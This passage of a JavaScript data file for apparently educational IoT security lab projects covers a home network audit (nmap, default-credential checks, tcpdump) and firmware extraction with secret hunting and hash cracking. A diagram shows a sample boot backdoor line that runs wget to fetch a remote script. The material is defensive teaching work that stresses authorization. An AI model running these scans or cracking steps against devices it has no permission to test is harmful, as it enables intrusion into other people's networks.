            '<text x="360" y="114" text-anchor="middle" fill="#8b949e" font-size="7">arp-scan (MAC vendor)</text>' +
            '<text x="360" y="128" text-anchor="middle" fill="#8b949e" font-size="7">tcpdump (traffic analysis)</text>' +
            '<text x="360" y="142" text-anchor="middle" fill="#8b949e" font-size="7">Default cred testing</text>' +
            '<text x="360" y="156" text-anchor="middle" fill="#f97316" font-size="7">192.168.1.0/24 scan</text>' +

            '<!-- Smart Camera — CRITICAL -->' +
            '<rect x="40" y="210" width="120" height="70" rx="6" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="40" y="210" width="120" height="16" rx="6" fill="rgba(239,68,68,0.15)"/>' +
            '<text x="100" y="222" text-anchor="middle" fill="#f87171" font-size="7" font-weight="600">IP CAMERA</text>' +
            '<text x="100" y="240" text-anchor="middle" fill="#ef4444" font-size="6">admin/admin</text>' +
            '<text x="100" y="252" text-anchor="middle" fill="#ef4444" font-size="6">RTSP open</text>' +
            '<text x="100" y="264" text-anchor="middle" fill="#ef4444" font-size="6">UPnP ON</text>' +
            '<circle cx="155" cy="220" r="4" fill="#ef4444" style="animation:sg69-pulse 1.5s ease-in-out infinite"/>' +
            '<text x="155" y="218" text-anchor="middle" fill="#ef4444" font-size="5">CRIT</text>' +

            '<!-- Smart Plug — HIGH -->' +
            '<rect x="180" y="210" width="120" height="70" rx="6" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="180" y="210" width="120" height="16" rx="6" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="240" y="222" text-anchor="middle" fill="#fb923c" font-size="7" font-weight="600">SMART PLUG</text>' +
            '<text x="240" y="240" text-anchor="middle" fill="#f97316" font-size="6">MQTT no auth</text>' +
            '<text x="240" y="252" text-anchor="middle" fill="#f97316" font-size="6">Port 1883 open</text>' +
            '<text x="240" y="264" text-anchor="middle" fill="#8b949e" font-size="6">Creds changed</text>' +
            '<circle cx="295" cy="220" r="4" fill="#f97316" style="animation:sg69-pulse 1.5s ease-in-out infinite;animation-delay:0.3s"/>' +
            '<text x="295" y="218" text-anchor="middle" fill="#f97316" font-size="5">HIGH</text>' +

            '<!-- Smart Thermostat — MEDIUM -->' +
            '<rect x="320" y="210" width="120" height="70" rx="6" fill="#1e2736" stroke="#eab308" stroke-width="1.5"/>' +
            '<rect x="320" y="210" width="120" height="16" rx="6" fill="rgba(234,179,8,0.12)"/>' +
            '<text x="380" y="222" text-anchor="middle" fill="#eab308" font-size="7" font-weight="600">THERMOSTAT</text>' +
            '<text x="380" y="240" text-anchor="middle" fill="#eab308" font-size="6">Cloud only</text>' +
            '<text x="380" y="252" text-anchor="middle" fill="#8b949e" font-size="6">HTTPS encrypted</text>' +
            '<text x="380" y="264" text-anchor="middle" fill="#8b949e" font-size="6">Strong password</text>' +
            '<circle cx="435" cy="220" r="4" fill="#eab308" style="animation:sg69-pulse 1.5s ease-in-out infinite;animation-delay:0.6s"/>' +
            '<text x="435" y="218" text-anchor="middle" fill="#eab308" font-size="5">MED</text>' +

            '<!-- Smart Speaker — LOW -->' +
            '<rect x="460" y="210" width="120" height="70" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1"/>' +
            '<rect x="460" y="210" width="120" height="16" rx="6" fill="rgba(34,197,94,0.08)"/>' +
            '<text x="520" y="222" text-anchor="middle" fill="#4ade80" font-size="7" font-weight="600">SPEAKER</text>' +
            '<text x="520" y="240" text-anchor="middle" fill="#8b949e" font-size="6">Encrypted comms</text>' +
            '<text x="520" y="252" text-anchor="middle" fill="#8b949e" font-size="6">Auto-updates</text>' +
            '<text x="520" y="264" text-anchor="middle" fill="#22c55e" font-size="6">No open ports</text>' +

            '<!-- Smart Lock — HIGH -->' +
            '<rect x="600" y="210" width="80" height="70" rx="6" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="600" y="210" width="80" height="16" rx="6" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="640" y="222" text-anchor="middle" fill="#fb923c" font-size="7" font-weight="600">LOCK</text>' +
            '<text x="640" y="240" text-anchor="middle" fill="#f97316" font-size="6">BLE no pair</text>' +
            '<text x="640" y="252" text-anchor="middle" fill="#f97316" font-size="6">Writable</text>' +
            '<text x="640" y="264" text-anchor="middle" fill="#8b949e" font-size="6">FW outdated</text>' +

            '<!-- Scan lines from Pi to devices -->' +
            '<line x1="310" y1="170" x2="100" y2="210" stroke="#3b82f6" stroke-width="1" stroke-dasharray="5,3" style="animation:sg69-scan 2s linear infinite"/>' +
            '<line x1="340" y1="170" x2="240" y2="210" stroke="#3b82f6" stroke-width="1" stroke-dasharray="5,3" style="animation:sg69-scan 2s linear infinite;animation-delay:0.3s"/>' +
            '<line x1="360" y1="170" x2="380" y2="210" stroke="#3b82f6" stroke-width="1" stroke-dasharray="5,3" style="animation:sg69-scan 2s linear infinite;animation-delay:0.6s"/>' +
            '<line x1="390" y1="170" x2="520" y2="210" stroke="#3b82f6" stroke-width="1" stroke-dasharray="5,3" style="animation:sg69-scan 2s linear infinite;animation-delay:0.9s"/>' +
            '<line x1="420" y1="170" x2="640" y2="210" stroke="#3b82f6" stroke-width="1" stroke-dasharray="5,3" style="animation:sg69-scan 2s linear infinite;animation-delay:1.2s"/>' +

            '<!-- Audit Report -->' +
            '<rect x="40" y="310" width="640" height="60" rx="6" fill="rgba(59,130,246,0.06)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="328" fill="#60a5fa" font-size="8" font-weight="600">AUDIT REPORT SUMMARY</text>' +
            '<text x="50" y="344" fill="#ef4444" font-size="7">2 CRITICAL</text>' +
            '<text x="140" y="344" fill="#f97316" font-size="7">2 HIGH</text>' +
            '<text x="210" y="344" fill="#eab308" font-size="7">1 MEDIUM</text>' +
            '<text x="310" y="344" fill="#22c55e" font-size="7">1 LOW</text>' +
            '<text x="400" y="344" fill="#8b949e" font-size="7">5 devices audited on 192.168.1.0/24</text>' +
            '<text x="50" y="360" fill="#8b949e" font-size="7">Remediation: Change defaults, disable UPnP, enable TLS, isolate VLAN, monitor outbound traffic</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Inventory All IoT Devices', content: '<p>Discover and catalog every device on your network.</p>', code: '# Full network scan with OS detection\nsudo nmap -sV -O 192.168.1.0/24 -oN ~/iot-audit/inventory.txt\n\n# ARP scan for MAC-based identification\nsudo arp-scan --localnet | tee ~/iot-audit/arp-scan.txt\n\n# Look up MAC vendor prefixes:\nawk \"{print \\$2}\" ~/iot-audit/arp-scan.txt | while read mac; do\n  vendor=$(grep -i "$(echo $mac | cut -d: -f1-3)" /usr/share/ieee-data/oui.txt 2>/dev/null | head -1)\n  echo "$mac -> $vendor"\ndone', language: 'Bash', tip: null }, { title: 'Test for Vulnerabilities', content: '<p>Check each device for common IoT security issues.</p>', code: '# For each device IP:\nTARGET=192.168.1.XXX\n\n# 1. Check for default credentials (web interface)\ncurl -s -o /dev/null -w "%{http_code}" http://$TARGET\n# Try admin/admin, admin/password, admin/(blank)\n\n# 2. Check open ports\nsudo nmap -sV -p- $TARGET\n\n# 3. Check for RTSP streams (cameras)\nffprobe rtsp://$TARGET:554/stream1 2>&1 | head -5\n\n# 4. Check for UPnP\nsudo nmap --script upnp-info -p 1900 $TARGET\n\n# 5. Check for unencrypted traffic\nsudo tcpdump -i eth0 host $TARGET -c 50 -n | \\\n  grep -v "443\\|8883" | head -20\n# Lines NOT on port 443 or 8883 = unencrypted', language: 'Bash', tip: null }, { title: 'Write the Audit Report', content: '<p>Document your findings in a professional security audit report format.</p>', code: 'cat << \'REPORTEOF\' > ~/iot-audit/report.md\n# IoT Security Audit Report\n## Hexworth Home Lab\n\n### Scope\n- Network: 192.168.1.0/24\n- Date: $(date +%Y-%m-%d)\n- Auditor: [Your Name]\n\n### Executive Summary\n[Number] devices audited. [Number] critical findings.\n\n### Findings\n\n#### CRITICAL\n1. [Device] has default credentials (admin/admin)\n   - Risk: Full device control by any network user\n   - Remediation: Change password immediately\n\n#### HIGH\n2. [Device] transmits data unencrypted on port 1883\n   - Risk: All sensor data readable by network sniffers\n   - Remediation: Enable TLS on MQTT broker\n\n#### MEDIUM\n3. [Device] has UPnP enabled\n   - Risk: Auto-exposes services to the internet\n   - Remediation: Disable UPnP in device settings\n\n### Recommendations\n1. Change all default passwords\n2. Isolate IoT devices on a separate VLAN\n3. Disable cloud/P2P services where possible\n4. Enable encryption (TLS/HTTPS) on all devices\n5. Monitor IoT traffic for anomalies\nREPORTEOF\n\necho "Report saved to ~/iot-audit/report.md"', language: 'Bash', tip: '<strong>This is a real skill.</strong> IoT security auditing is a growing field. Organizations hire consultants to assess their smart building systems, medical IoT devices, and industrial controls. The methodology you just practiced is the same one used in professional IoT penetration tests.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>All network devices inventoried with IP, MAC, and vendor</li><li>Each device tested for default credentials, open ports, encryption</li><li>Audit report written with findings and remediation</li><li>At least one finding remediated (password changed, UPnP disabled, etc.)</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>nmap OS detection (-O) shows "Too many fingerprints match":</strong> IoT devices often run embedded Linux that does not match nmap fingerprint databases well. Use <code>-sV</code> (service version) instead of <code>-O</code> for more reliable identification. Combine with MAC vendor lookup for device classification.</li>' +
                         '<li><strong>arp-scan shows fewer devices than expected:</strong> Devices on different subnets or VLANs will not appear in ARP scan. If your router creates a separate IoT VLAN, you need to scan from within that VLAN. Also, some devices (smart bulbs, Zigbee sensors) are not directly on the IP network &mdash; they connect through a hub/bridge.</li>' +
                         '<li><strong>Device web interface not responding on expected port:</strong> Some devices use non-standard ports (8080, 8443, 8888). Run <code>nmap -p 1-65535</code> for a full port scan. HTTPS-only devices will not respond on port 80.</li>' +
                         '<li><strong>tcpdump captures too much traffic to analyze:</strong> Filter by host: <code>sudo tcpdump -i eth0 host DEVICE_IP -w capture.pcap</code>. For a network-wide overview, capture DNS only: <code>sudo tcpdump -i eth0 port 53 -n</code> to see which domains each device is contacting.</li>' +
                         '<li><strong>Cannot identify some devices by MAC vendor:</strong> Check the first three octets of the MAC address against the IEEE OUI database at <code>https://standards-oui.ieee.org/</code>. Some manufacturers use OUIs registered to their chip supplier (Espressif, Realtek) rather than their own company name.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Automated Vulnerability Scanner</strong> &mdash; Write a Bash or Python script that takes a network range, discovers all hosts, checks each for default credentials on common ports (80, 443, 554, 8080), tests for open MQTT (1883), Telnet (23), and FTP (21), and generates an HTML report with severity ratings. This is a mini-Nessus for IoT.</p>' +
                    '<p><strong>Challenge 2: Network Segmentation Implementation</strong> &mdash; Configure your home router to create an IoT VLAN that isolates all smart devices from your main network. IoT devices should be able to reach the internet (for cloud services) but not access your computers, NAS, or other sensitive resources. Test that segmentation works by attempting cross-VLAN connections.</p>' +
                    '<p><strong>Challenge 3: Continuous Monitoring</strong> &mdash; Set up a lightweight monitoring solution (using tools from previous projects: MQTT alerts, network scanning cron jobs) that runs 24/7 on your Pi. It should alert you when a new device joins the network, when an IoT device contacts an unexpected IP, or when a previously secured device reverts to default settings.</p>',

        commonMistakes: [
            {
                title: 'Scanning Other People Devices or Networks',
                correct: 'Only scan and audit devices and networks you personally own or have explicit written authorization to test. Stick to your own home network.',
                incorrect: 'Running nmap scans against your apartment building shared network, your neighbor\'s WiFi, or devices you do not own.',
                consequence: 'Port scanning and vulnerability testing without authorization is illegal. Even well-intentioned security scanning of networks you do not own can result in criminal charges.'
            },
            {
                title: 'Reporting Findings Without Remediation Steps',
                correct: 'Each finding in the audit report should include a specific, actionable remediation step with clear instructions the device owner can follow.',
                incorrect: 'Listing vulnerabilities without explaining how to fix them, leaving the report as a list of problems with no solutions.',
                consequence: 'An audit report without remediation is useless to the recipient. They know things are broken but not how to fix them. Professional penetration test reports always include remediation guidance ranked by priority.'
            },
            {
                title: 'Testing One Device and Generalizing to All',
                correct: 'Test every device individually. Each manufacturer and model has different default credentials, open ports, and vulnerabilities. Audit comprehensively.',
                incorrect: 'Testing one smart plug and assuming all other IoT devices on the network have the same security posture.',
                consequence: 'Different devices have completely different attack surfaces. A device you skip might be the one with an open Telnet port, default root password, or UPnP exposing it to the internet.'
            }
        ] },

    'sg-70': {
        // Wokwi wave 4: N/A (Linux software) — firmware analysis is desktop tooling.
        simulator: { available: false, label: 'No Special Hardware — Runs on Any Linux', note: 'Firmware extraction and analysis is <strong>desktop tooling</strong> (binwalk, unsquashfs, strings, Ghidra) on a firmware image &mdash; run it on any Linux box or VM. You only need a firmware file to work through the whole build; no board required.' }, intro: '<p>IoT device firmware often contains hardcoded credentials, API keys, encryption keys, and debug backdoors. In this project you will download firmware from a manufacturer website, extract the filesystem with binwalk, and analyze the contents for security vulnerabilities.</p>', wiring: '    Linux workstation + firmware image file', wiringNotes: '<p><strong>Legal:</strong> Analyzing firmware you have legally obtained (downloaded from manufacturer, extracted from a device you own) is generally legal under reverse engineering exceptions. Always check your jurisdiction.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg70-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg70-extract{0%{stroke-dashoffset:12}100%{stroke-dashoffset:0}}' +
            '@keyframes sg70-alert{0%,100%{fill:rgba(239,68,68,0.15)}50%{fill:rgba(239,68,68,0.5)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg70-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-70 FIRMWARE REVERSE ENGINEERING</text>' +

            '<!-- Firmware Binary -->' +
            '<rect x="40" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="40" y="60" width="160" height="24" rx="8" fill="rgba(249,115,22,0.12)"/>' +
            '<rect x="40" y="76" width="160" height="8" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="120" y="76" text-anchor="middle" fill="#fb923c" font-size="9" font-weight="600">firmware.bin</text>' +
            '<text x="120" y="100" text-anchor="middle" fill="#8b949e" font-size="7">16 MB binary image</text>' +
            '<text x="120" y="116" text-anchor="middle" fill="#8b949e" font-size="7">Bootloader + Kernel +</text>' +
            '<text x="120" y="130" text-anchor="middle" fill="#8b949e" font-size="7">SquashFS rootfs</text>' +
            '<text x="120" y="148" text-anchor="middle" fill="#f97316" font-size="7">Downloaded from vendor</text>' +

            '<!-- binwalk (Extraction Tool) -->' +
            '<rect x="280" y="60" width="160" height="80" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="280" y="60" width="160" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="280" y="76" width="160" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="76" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">BINWALK</text>' +
            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="7">binwalk -e firmware.bin</text>' +
            '<text x="360" y="116" text-anchor="middle" fill="#8b949e" font-size="7">Entropy: binwalk -E</text>' +
            '<text x="360" y="132" text-anchor="middle" fill="#22c55e" font-size="7">SquashFS extracted</text>' +

            '<!-- Arrow from firmware to binwalk -->' +
            '<line x1="200" y1="100" x2="280" y2="100" stroke="#f97316" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg70-extract 1.5s linear infinite"/>' +

            '<!-- Extracted Filesystem -->' +
            '<rect x="520" y="50" width="160" height="180" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="520" y="50" width="160" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="520" y="66" width="160" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="600" y="66" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="600">EXTRACTED FS</text>' +
            '<text x="535" y="88" fill="#8b949e" font-size="7">/etc/passwd</text>' +
            '<text x="535" y="104" fill="#8b949e" font-size="7">/etc/shadow</text>' +
            '<text x="535" y="120" fill="#ef4444" font-size="7">/etc/init.d/rcS</text>' +
            '<text x="535" y="136" fill="#8b949e" font-size="7">/usr/bin/httpd</text>' +
            '<text x="535" y="152" fill="#ef4444" font-size="7">/etc/mosquitto.conf</text>' +
            '<text x="535" y="168" fill="#8b949e" font-size="7">/usr/lib/libssl.so.1.0</text>' +
            '<text x="535" y="184" fill="#ef4444" font-size="7">/root/.ssh/id_rsa</text>' +
            '<text x="535" y="200" fill="#8b949e" font-size="7">/etc/cloud_api.key</text>' +
            '<text x="535" y="216" fill="#a855f7" font-size="7">/dev/mtdblock0-2</text>' +

            '<!-- Arrow from binwalk to filesystem -->' +
            '<line x1="440" y1="100" x2="520" y2="100" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg70-extract 1.5s linear infinite;animation-delay:0.5s"/>' +

            '<!-- Findings Panel -->' +
            '<rect x="40" y="200" width="440" height="170" rx="8" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="40" y="200" width="440" height="24" rx="8" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="40" y="216" width="440" height="8" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="260" y="216" text-anchor="middle" fill="#f87171" font-size="9" font-weight="600">SECURITY FINDINGS</text>' +

            '<!-- Finding 1 -->' +
            '<rect x="52" y="236" width="200" height="50" rx="4" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.3)" stroke-width="0.5" style="animation:sg70-alert 3s ease-in-out infinite"/>' +
            '<text x="62" y="252" fill="#ef4444" font-size="7" font-weight="600">HARDCODED ROOT PASSWORD</text>' +
            '<text x="62" y="266" fill="#8b949e" font-size="6">/etc/shadow: root:$1$abc:0:0...</text>' +
            '<text x="62" y="278" fill="#ef4444" font-size="6">Cracked in 3 seconds: &quot;admin123&quot;</text>' +

            '<!-- Finding 2 -->' +
            '<rect x="268" y="236" width="200" height="50" rx="4" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.3)" stroke-width="0.5"/>' +
            '<text x="278" y="252" fill="#ef4444" font-size="7" font-weight="600">SSH PRIVATE KEY</text>' +
            '<text x="278" y="266" fill="#8b949e" font-size="6">/root/.ssh/id_rsa (unencrypted)</text>' +
            '<text x="278" y="278" fill="#ef4444" font-size="6">Manufacturer backdoor access</text>' +

            '<!-- Finding 3 -->' +
            '<rect x="52" y="296" width="200" height="50" rx="4" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)" stroke-width="0.5"/>' +
            '<text x="62" y="312" fill="#f97316" font-size="7" font-weight="600">OUTDATED OPENSSL</text>' +
            '<text x="62" y="326" fill="#8b949e" font-size="6">libssl.so.1.0.1e (CVE-2014-0160)</text>' +
            '<text x="62" y="338" fill="#f97316" font-size="6">Heartbleed vulnerable!</text>' +

            '<!-- Finding 4 -->' +
            '<rect x="268" y="296" width="200" height="50" rx="4" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)" stroke-width="0.5"/>' +
            '<text x="278" y="312" fill="#f97316" font-size="7" font-weight="600">STARTUP BACKDOOR</text>' +
            '<text x="278" y="326" fill="#8b949e" font-size="6">rcS: wget http://cn-server/check.sh</text>' +
            '<text x="278" y="338" fill="#f97316" font-size="6">Downloads and executes on every boot</text>' +

            '<!-- Analysis tools callout -->' +
            '<rect x="520" y="260" width="160" height="50" rx="6" fill="rgba(168,85,247,0.06)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="530" y="278" fill="#c084fc" font-size="7" font-weight="600">ANALYSIS TOOLS</text>' +
            '<text x="530" y="292" fill="#8b949e" font-size="6">strings | grep | file | Ghidra</text>' +
            '<text x="530" y="304" fill="#8b949e" font-size="6">john (hash cracking)</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Obtain and Extract Firmware', content: '<p>Download firmware from a manufacturer website and extract the filesystem.</p>', code: '# Install analysis tools\nsudo apt install binwalk firmware-mod-kit sasquatch -y\npip3 install ubi_reader jefferson\n\n# Download sample firmware (many manufacturers publish updates)\n# Example: TP-Link, Netgear, D-Link publish firmware on their support sites\n\n# Extract with binwalk\nbinwalk -e firmware.bin\ncd _firmware.bin.extracted/\n\n# List extracted files\nfind . -type f | head -30\nls -la squashfs-root/ 2>/dev/null', language: 'Bash', tip: null }, { title: 'Search for Secrets', content: '<p>Search the extracted filesystem for hardcoded credentials, keys, and sensitive configuration.</p>', code: '# Search for credentials\ngrep -ri "password\\|passwd\\|secret\\|key\\|token\\|api_key" . --include="*.conf" --include="*.cfg" --include="*.sh" --include="*.py" --include="*.lua" | head -30\n\n# Check for shadow/passwd files\ncat squashfs-root/etc/passwd 2>/dev/null\ncat squashfs-root/etc/shadow 2>/dev/null\n\n# Search for SSH keys\nfind . -name "id_rsa" -o -name "*.pem" -o -name "*.key"\n\n# Search for hardcoded IPs and URLs\ngrep -rhoP "https?://[\\w.-]+[/\\w.-]*" . | sort -u | head -20\n\n# Search for certificates\nfind . -name "*.crt" -o -name "*.cert" -exec echo "Found: {}" \\;\n\n# Check startup scripts for backdoors\nfind . -name "rcS" -o -name "rc.local" -o -name "init.sh" -exec cat {} \\;', language: 'Bash', tip: '<strong>Common findings:</strong> Hardcoded root passwords (often MD5 or SHA-256 hashed — crackable), telnet/SSH enabled by default with known credentials, API keys for cloud services, debug interfaces left enabled, and wget/curl commands that download additional code from remote servers on boot.' }, { title: 'Analyze Binaries', content: '<p>Check compiled binaries for security information.</p>', code: '# Find executables\nfind . -type f -executable | head -20\n\n# Check binary properties\nfile squashfs-root/usr/bin/httpd 2>/dev/null\n\n# Look for strings in web server binary\nstrings squashfs-root/usr/bin/httpd 2>/dev/null | grep -i "password\\|admin\\|backdoor\\|debug" | head -20\n\n# Check for known vulnerable libraries\nfind . -name "libssl*" -o -name "libc.so*" -o -name "busybox" | while read f; do\n  echo "$f: $(strings \"$f\" | grep -i version | head -1)"\ndone\n\n# Check security features\nfile squashfs-root/usr/bin/* 2>/dev/null | grep -c "not stripped"\n# "not stripped" = debug symbols included = easier to reverse engineer', language: 'Bash', tip: null } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>Firmware extracted with binwalk</li><li>Filesystem contents accessible and browsable</li><li>At least one hardcoded credential or key found</li><li>Startup scripts reviewed for backdoors</li><li>Can articulate the security risks of the findings</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>binwalk extracts 0 files from firmware image:</strong> The firmware may use a non-standard or proprietary compression format. Check entropy with <code>binwalk -E firmware.bin</code> &mdash; flat high entropy indicates encryption. Try <code>dd</code> to skip unknown headers and re-scan: <code>dd if=firmware.bin of=payload.bin bs=1 skip=256 && binwalk -e payload.bin</code>.</li>' +
                         '<li><strong>"sasquatch" or "jefferson" not found during extraction:</strong> These tools handle SquashFS and JFFS2 filesystems respectively. Install them: <code>sudo apt install sasquatch</code> or build from source. Without them, binwalk cannot extract certain filesystem types commonly used in router and camera firmware.</li>' +
                         '<li><strong>Extracted filesystem shows symlinks that point nowhere:</strong> This is normal. The symlinks reference paths relative to the device root filesystem. Use <code>find . -type l</code> to list them and <code>readlink</code> to see their targets. Evaluate them in context of the extracted root, not your host filesystem.</li>' +
                         '<li><strong>strings command produces massive output:</strong> Filter by minimum string length and context: <code>strings -n 8 firmware.bin | grep -iE "password|key|secret|token|http|ftp|telnet"</code>. The <code>-n 8</code> flag filters out short noise strings. Pipe through <code>sort -u</code> to remove duplicates.</li>' +
                         '<li><strong>Cannot determine architecture of extracted binaries:</strong> Use the <code>file</code> command: <code>file squashfs-root/usr/bin/*</code>. Common architectures for IoT: MIPS (big/little endian), ARM, AArch64, and x86 (rare). You need the correct architecture to use tools like Ghidra or radare2 for disassembly.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Firmware Diffing</strong> &mdash; Download two consecutive firmware versions from the same manufacturer. Extract both and use <code>diff -rq</code> to identify changed files. Analyze the changes to determine what was patched. Did they fix a known CVE? Did they add new functionality? Document your findings in a changelog.</p>' +
                    '<p><strong>Challenge 2: Credential Cracking</strong> &mdash; Extract password hashes from the firmware <code>/etc/shadow</code> file. Use <code>john</code> (John the Ripper) or <code>hashcat</code> to attempt to crack them. Many IoT devices use weak, short passwords that crack in seconds. Document the hash type, cracking time, and resulting password.</p>' +
                    '<p><strong>Challenge 3: CVE Correlation</strong> &mdash; Identify the versions of key libraries in the firmware (OpenSSL, BusyBox, lighttpd, dnsmasq). Check each version against the CVE database (nvd.nist.gov). List all known vulnerabilities that affect the firmware and rate them by CVSS score. This is the same process used in professional firmware security audits.</p>',

        commonMistakes: [
            {
                title: 'Running Extracted Binaries on Host Machine',
                correct: 'Never execute binaries extracted from untrusted firmware. Analyze them statically with <code>strings</code>, <code>file</code>, and disassemblers (Ghidra). If dynamic analysis is needed, use an emulator like QEMU in an isolated VM.',
                incorrect: 'Running <code>./extracted_binary</code> from the firmware on your analysis workstation to see what it does.',
                consequence: 'The binary may contain malware, backdoors, or destructive code. Even if the architecture does not match (MIPS binary on x86), attempting execution can still trigger unexpected behavior. Always use static analysis or sandboxed emulation.'
            },
            {
                title: 'Downloading Firmware Over HTTP Without Verification',
                correct: 'Verify firmware integrity using checksums (MD5, SHA-256) published by the manufacturer. Download over HTTPS when available. Compare file sizes against expected values.',
                incorrect: 'Downloading firmware from random forum links or unverified mirrors without checking hashes.',
                consequence: 'You may be analyzing a trojanized firmware image that has been modified to include additional backdoors. Your entire analysis is then based on a compromised sample, and any conclusions are invalid.'
            },
            {
                title: 'Ignoring Build Artifacts and Debug Symbols',
                correct: 'Check for unstripped binaries (<code>file binary | grep "not stripped"</code>), leftover build paths, compiler artifacts, and debug logs. These often reveal the development environment, internal network paths, and developer credentials.',
                incorrect: 'Only searching for "password" and "admin" strings while ignoring other metadata in the firmware.',
                consequence: 'You miss valuable intelligence. Debug symbols reveal function names, build paths expose internal infrastructure, and compiler strings identify the toolchain and SDK version &mdash; all useful for deeper vulnerability research.'
            }
        ] },

    'sg-71': {
        // Wokwi wave 4: NO SIM — CoAP server on ESP32 must be reachable inbound by a client (Wokwi doesn't expose inbound to the sim).
        simulator: { available: false, note: 'This build runs a <strong>CoAP server on the ESP32</strong> and hits it from a client on your computer &mdash; but Wokwi&#39;s simulated ESP32 is not reachable inbound from an external CoAP client, so the core interaction can&#39;t be exercised in the simulator. Read/flash the server code here; test it against the board on your real network.' }, intro: '<p>CoAP (Constrained Application Protocol) is the lightweight REST-like protocol for resource-constrained IoT devices. Unlike HTTP, CoAP uses UDP, supports multicast discovery, and is designed for devices with kilobytes of RAM. In this project you will implement a CoAP server on an ESP32 and interact with it from a client.</p>', wiring: '    ESP32 DevKit running CoAP server + computer with CoAP client', wiringNotes: '<p><strong>CoAP vs HTTP:</strong> CoAP uses UDP port 5683 (unencrypted) or 5684 (DTLS encrypted). Messages are binary, not text. It supports GET, PUT, POST, DELETE like HTTP but with 4-byte headers instead of hundreds of bytes.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg71-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg71-udp{0%{stroke-dashoffset:14}100%{stroke-dashoffset:0}}' +
            '@keyframes sg71-led{0%,100%{fill:rgba(34,197,94,0.15)}50%{fill:rgba(34,197,94,0.8)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg71-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-71 CoAP PROTOCOL ON ESP32</text>' +

            '<!-- ESP32 (CoAP Server) -->' +
            '<rect x="40" y="80" width="200" height="200" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="40" y="80" width="200" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="40" y="96" width="200" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="140" y="96" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">ESP32 CoAP SERVER</text>' +
            '<!-- USB port -->' +
            '<rect x="16" y="100" width="28" height="18" rx="3" fill="#1a1f2b" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="30" y="112" text-anchor="middle" fill="#3b82f6" font-size="5">USB</text>' +

            '<!-- WiFi label -->' +
            '<text x="140" y="122" text-anchor="middle" fill="#a855f7" font-size="8">WiFi: 192.168.1.50</text>' +

            '<!-- CoAP Resources -->' +
            '<text x="55" y="145" fill="#60a5fa" font-size="7" font-weight="600">RESOURCES:</text>' +
            '<rect x="55" y="152" width="170" height="18" rx="3" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="62" y="164" fill="#22c55e" font-size="7">/light    [GET, PUT]</text>' +
